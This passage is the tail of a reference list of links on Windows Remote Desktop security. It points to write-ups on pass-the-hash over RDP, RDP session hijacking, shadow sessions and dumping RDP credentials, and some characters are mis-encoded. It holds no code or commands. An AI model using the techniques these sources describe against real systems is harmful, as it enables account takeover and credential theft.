  [https://3gstudent.github.io/backup-3gstudent.github.io/æ¸—é€æŠ€å·§-Pass-the-Hash-with-Remote-Desktop-Protocol/](https://3gstudent.github.io/backup-3gstudent.github.io/æ¸—é€æŠ€å·§-Pass-the-Hash-with-Remote-Desktop-Protocol/)
- Remote Desktop Services: Enable Restricted Admin mode  
  [https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx](https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx)
- Viewing a Remote Userâ€™s Desktop Session with Shadow Mode in Windows  
  [https://woshub.com/rdp-session-shadow-to-windows-10-user/](https://woshub.com/rdp-session-shadow-to-windows-10-user/)
- Passwordless RDP Session Hijacking Feature All Windows versions  
  [https://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html](https://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html)
- Remote Desktop using C#.NET  
  [https://www.codeproject.com/Articles/43705/Remote-Desktop-using-C-NET](https://www.codeproject.com/Articles/43705/Remote-Desktop-using-C-NET)
- Dumping RDP Credentials  
  [https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)
